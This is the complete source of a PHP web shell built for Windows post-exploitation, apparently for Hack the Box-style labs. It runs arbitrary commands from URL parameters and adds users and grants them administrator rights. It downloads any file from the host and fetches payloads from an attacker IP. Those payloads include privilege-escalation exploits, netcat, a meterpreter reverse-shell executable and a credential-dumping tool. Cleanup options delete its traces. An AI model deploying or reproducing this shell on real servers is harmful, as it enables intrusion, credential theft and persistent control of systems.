<?php
session_start();
function is_post_request() {
    return $_SERVER['REQUEST_METHOD'] == 'POST';
}
function is_get_request() {
    return $_SERVER['REQUEST_METHOD'] == 'GET';
}

// Set these variables to YOUR attack box
$attackip = "10.0.2.40";
$attackport = "8000";
?>
<!doctype html>
<html lang="en">
    <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>The Not-So Simple Command Shell by KaotickJ</title>
	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"> 
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
	<style type="text/css">
		.main_body {
			-webkit-text-size-adjust: 100%;
			-ms-text-size-adjust: 100%;
			-webkit-tap-highlight-color: rgba(0, 0, 0, 0);
			background: #190565;
			border:1px solid #333;
			width:55%;
			padding:20px 30px;
			margin: 10px auto;
			color:#fff;
		}
		input {
			height: 35px!important;
		}
		a {
			color:goldenrod;
		}
		a:hover {
			color:yellow;
			text-decoration:none;
		}
		select {
			height:35px;
		}
	</style>
    <script src="//code.jquery.com/jquery-1.10.2.js"></script>
    </head>
    <body>
<?php
        if(isset($_GET['download'])) {
            $filename = $_GET['download'];
            if(file_exists($filename)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header("Cache-Control: no-cache, must-revalidate");
                header("Expires: 0");
                header('Content-Disposition: attachment; filename="'.basename($filename).'"');
                header('Content-Length: ' . filesize($filename));
                header('Pragma: public');
                flush();
                readfile($filename);
                die();
            } else{
                echo '<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>resource not found. make sure specified file exists on the target box</p></div>';
            }
        }
        echo '
        <div class="main_body">
		<h4 style="text-align:center;">The Not So Simple PHP Command Shell</h4><br>
        <div style="display:inline;margin:10px;"><form style="float:left" action="" method="get">Command<br><input type="text" name="cmd" autofocus placeholder="Type a command" /><button type="submit" class="btn btn-primary"><i class="fa fa-gear"></i> Execute</button></form><form style="float:right" action="nsscmdshell.php" method="GET"> <a href="?links=1" role="button" class="btn btn-primary"><i class="fa fa-external-link"></i> QuickLinks </a>&nbsp;<button name="phpInfo" class="btn btn-primary"><i class="fa fa-file-code-o"></i> PHPInfo </button>&nbsp;<button name="check" id="action-button" title="show var_dump for $_SESSION[\'actions\']" class="btn btn-primary"><i class="fa fa-history"></i> Show History </button> <button name="clean" id="action-button" title="deletes all files uploaded using nsscmdshell." class="btn btn-danger"><i class="fa fa-trash"></i> Cleanup Files </button></form>
		</div>
<p>&nbsp;</p>
        File Options<br>
        <form action="" method="get">
        <select name="upload">
        <option>Choose</option>
        <option value="Invoke-WScriptBypassUAC.ps1" title="bypasses uac to execute vbscript code with elevated privileges.  you need to edit the code to make it usable">WScriptBypassUAC (Win7)</option>
        <option value="jaws-enum.ps1" title="Just Another Windows Enumeration Script - aka just the best windows enum script">JAWs Enum</option>
        <option value="ms15-05132.exe" title="x86 only">MS15-051 Priv Esc</option>
        <option value="ms15-05164.exe" title="x64 only">MS15-051 Priv Esc</option>
        <option value="nc.exe" title="netcat for windows x86 version">Netcat 32</option>
        <option value="nc64.exe" title="netcat for win x64">Netcat 64</option>
        <option value="PowerUp.ps1">PowerUp.ps1</option>
        <option value="Taihou32.exe" title="ms15-051~15-1701 Windows Kernel Mode Drivers local Priv Esc for x86">Taihou32 15-1701 PrivEsc</option>
        <option value="Taihou64.exe" title="ms15-051~15-1701 Windows Kernel Mode Drivers local Priv Esc for x64">Taihou64 15-1701 PrivEsc </option>
        <option value="venom.exe" title="msfvenom windows/meterpreter/reverse_tcp shell exe">VENOM.EXE</option>
        <option value="wce32.exe" title="windows credential editor x86">WCE 32</option>
        <option value="wce64.exe" title="windows credential editor x64">WCE 64</option>
        <option value="wce-universal.exe" title="windows credential editor that only seems to work with xp">WCE Universal</option>
        </select><button type="submit" class="btn btn-primary"><i class="fa fa-upload"></i> Upload</button>
        </form>
        <br>
        <form action="" method="get" enctype="multipart/form-data"><input name="upload" type="file" placeholder="File to Upload" /><button type="submit" class="btn btn-primary"><i class="fa fa-upload"></i> Upload</button></form><br>
        <form action="" method="get"><input type="text" name="download" placeholder="File to Download"/><button type="submit" title="downloads file to attack machine" class="btn btn-primary"><i class="fa fa-download"></i> Download</button></form><br>
        <form action="" method="get">
        Quick Enum Options<br>
        <button type="submit" name="cmd" value="systeminfo" title="runs systeminfo command" class="btn btn-primary"><i class="fa fa-search"></i> System Info</button>&nbsp;<button type="submit" name="cmd" value="whoami" title="shows current user" class="btn btn-primary"><i class="fa fa-id-card"></i> Whoami</button>&nbsp<button type="submit" name="cmd" value="echo %username%" title="another option to display current user" class="btn btn-primary"><i class="fa fa-id-card"></i> Username</button>&nbsp;<button type="submit" name="cmd" value="whoami /all" title="gives current user information" class="btn btn-primary"><i class="fa fa-address-book"></i> User Info</button>&nbsp;<button type="submit" name="cmd" value="net user" title="lists all users" class="btn btn-primary"><i class="fa fa-users"></i> All Users</button>&nbsp;<button type="submit" name="cmd" value="netsh wlan show profiles" title="shows saved wifi ap data if the target uses a wifi interface" class="btn btn-primary"><i class="fa fa-wifi"></i> WLAN Profiles</button><br><br><button type="submit" name="cmd" value="tasklist" title="show running processes" class="btn btn-primary"><i class="fa fa-gears"></i> Processes</button>&nbsp<button type="submit" name="cmd" value="driverquery" title="list drivers" class="btn btn-primary"><i class="fa fa-database"></i> Drivers</button>&nbsp<button type="submit" name="cmd" value="driverquery | findstr Kernel" title="look for potential kernel exploits" class="btn btn-primary"><i class="fa fa-warning"></i> Kernel Exploits</button>&nbsp<button type="submit" name="cmd" value="fsutil fsinfo drives" title="list all drives" class="btn btn-primary"><i class="fa fa-list-ol"></i> List Drives</button>&nbsp<button type="submit" name="cmd" value="set" title="environment variable settings" class="btn btn-primary"><i class="fa fa-th-list"></i> EnVars</button>&nbsp;<button type="submit" name="cmd" value="qwinsta" title="information about sessions" class="btn btn-primary"><i class="fa fa-clock-o"></i> Query Session</button>
        </form><br>
        User Management Options<br>
        <form action="" method="get">
        <input type="text" name="user" placeholder="user to alter" />&nbsp;&nbsp;<input type="text" name="pass" placeholder="password if adding user" />
        <br><br>
        <button type="submit" name="addUser" title="adds the specified user to the system with the password provided." class="btn btn-primary"><i class="fa fa-user-plus"></i> Add User</button>&nbsp;<button type="submit" name="userAdmin" title="sets the specified user as adminstrator. only works with sufficient permissions on the current user." class="btn btn-primary"><i class="fa fa-user-secret"></i> Set Admin</button>&nbsp;<button type="submit" name="userStandard" title="sets the specified user as a standard user. only works with sufficient permissions on the current user." class="btn btn-primary"><i class="fa fa-user"></i> Set Standard User</button>&nbsp;<button type="submit" name="delUser" title="deletes the specified user from the system. only works with sufficient permissions on the current user." class="btn btn-danger"><i class="fa fa-user-times"></i> DelUser</button>&nbsp;&nbsp;&nbsp;&nbsp;
        </form><br><form><a role="button" href="?update=true" title="Check for and Download newer version of NSSCMDSHELL.php" class="btn btn-success"><i class="fa fa-retweet"></i> Update</a> <input type="hidden" name="clear" value="true" /><button onClick="window.location.reload();" class="btn btn-danger"><i class="fa fa-refresh"></i> Clear Console</button><div style="float:right;"><a href="https://app.hackthebox.com/profile/476578" target="_blank" title="KaotickJ on Hack the Box"><img src="https://img.shields.io/badge/Powered%20by-Kaos-red" /></a></div></form></div>';

        if (isset($_GET['addUser'])){
            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a username for the new user</p></div>');
            if(empty($_GET['pass'])) die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a password for the new user</p></div>');
            echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
            echo (system("net user ".$_GET['user']." ".$_GET['pass']." /add"));
            echo '</pre>';
        }

        if (isset($_GET['userAdmin'])){
            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a user to escelate to admin</p></div>');
            echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
            echo (system("net localgroup administrators ".$_GET['user']." /add"));
            echo '</pre>';
        }

        if (isset($_GET['userStandard'])){
            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a user to revoke admin</p></div>');
            echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
            echo (system("net localgroup administrators ".$_GET['user']." /del"));
            echo '</pre>';
        }

        if (isset($_GET['delUser'])){
            if(empty($_GET['user'])) die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>you need to enter a user to delete</p></div>');
            echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
            echo (system("net user ".$_GET['user']." /del"));
            echo '</pre>';
        }

        if (isset($_GET['upload'])) {
            if($_GET['upload'] == "") die('<div style="background:red;color:#fff;margin:10px auto;padding:30px;width:55%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
            if($_GET['upload'] == "Choose") die('<div style="background:red;color:#fff;margin:10px auto;padding:30px;width:55%;"><h4>Error!</h4><p>you must choose a file to upload first.</p></div>');
            $action = $_GET['upload'];
                if(!in_array($action, $_SESSION['actions'])) {
                $_SESSION['actions'][] = $action;
//				var_dump($_SESSION['actions']);
                }
            if(!file_put_contents($_GET['upload'], file_get_contents("http://".$attackip.":".$attackport."/" .$_GET['upload']))) {
                die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>Upload Failed!</p>');
            } else {
                echo '<div style="width:55%;margin:20px 40px;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;">
                          <p>File uploaded successfully.</p>
                </div>';
            }
/*            echo '<pre>';
            var_dump($_SESSION['actions']);
            echo '</pre>';*/
            }


        if (isset($_GET['cmd'])) {
            if($_GET['cmd'] == "") die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>no command specified. you must enter a command to be executed</p></div>');
            echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">';
            echo (system($_GET['cmd']));
            echo '</pre>';
        }

        if (isset($_GET['update']) && $_GET['update'] == "true"){
            file_put_contents('nsscmdshell.php', file_get_contents('https://raw.githubusercontent.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/main/nsscmdshell.php'));
		}

        if (isset($_GET['links'])) {
           echo '<div style="width:55%;margin:10px auto;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;">
            <p>Quick Links:</p>
            <a href="https://github.com/frizb/MSF-Venom-Cheatsheet" target="_blank">Msfvenom Cheat Sheet</a><br>
            <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank">Reverse Shell Cheat Sheet</a><br>
            <a href="https://www.exploit-db.com/" target="_blank">ExploitDB</a><br>
            <a href="https://cxsecurity.com/exploit/" target="_blank" target="_blank">CX Security Vulnerability Database</a><br>
            <a href="https://int0x33.medium.com/day-76-use-nishang-empire-and-other-ps1-scripts-manually-332b4604e2a7" target="_blank">Nishang Usage</a><br>
            <a href="https://int0x33.medium.com/day-26-the-complete-list-of-windows-post-exploitation-commands-no-powershell-999b5433b61e" target="_blank">Windows Post-Exploitation Commands</a>';
            }

if (is_get_request()){
	if (isset($_GET['phpInfo'])) {
//        echo '<pre>';
        phpinfo();
//        echo '</pre>';
    }
    if (isset($_GET['kill_me'])) {
            if (!unlink ('nsscmdshell.php')){
                die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>File can\'t be deleted.</p>');
            }
            else {
				echo 'Success!<br>';
            }

    }

    if (isset($_GET['clean'])) {
		if (session_status() === PHP_SESSION_NONE) {
			session_start();
		}
		$cleans = $_SESSION['actions'];
        $alerts = "";
        foreach($cleans as $clean) {
            if (!unlink ($clean)){
                die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>'. $clean .' can\'t be deleted.</p>');
            }
            else {
            $alerts .= $clean .'<br>';
            }
        }
            if ($_SESSION){
                unset($_SESSION['actions']);
                session_destroy();
                ob_start();
                ob_clean();
                sleep(1);
                if ($_SESSION['actions'] == NULL) {
                   ?>
    <script type="text/javascript">
        $(function () {
            $("#btnSubmit").click(function () {
                var result = confirm("Are you sure? This will REALLY delete this file!");

                if (result == true) {
                    return true;
                }

                else {
                    return false;
                }
            });
        });
    </script>
                   <div style="width:55%;margin:10px auto;padding:20px 30px;color:#fff;background-color:green;font-size:1.2em;"><p>Deleted: </p><?php echo $alerts; ?><p>Cleanup completed successfully.</p><p>Do you also want to delete nsscmdshell.php?</p> <form action="" method="get"><br><button class="btn btn-danger" id="btnSubmit" name="kill_me">Delete nsccmdshell.php </button> <a role="button" href="?clear=true" class="btn"><button class="btn btn-warning">Keep nsscmdshell.php</button></a></form></div>
<?php
                }
            } else {
                die('<div style="background:red;color:#fff;margin:10px auto;padding:20px;width:55%;"><h4>Error!</h4><p>Nothing to do!</p></div>');
            }
    }
    if (isset($_GET['check'])) {
        echo '<pre style="margin:20px 40px;padding:20px 30px;color:#fff;background-color:#000;font-size:1.2em;"><h4> Contents of $_SESSION[\'actions\']: </h4>';
        var_dump($_SESSION['actions']);
        echo '</pre>';
    }

}

?>
		</div>
    </body>
</html>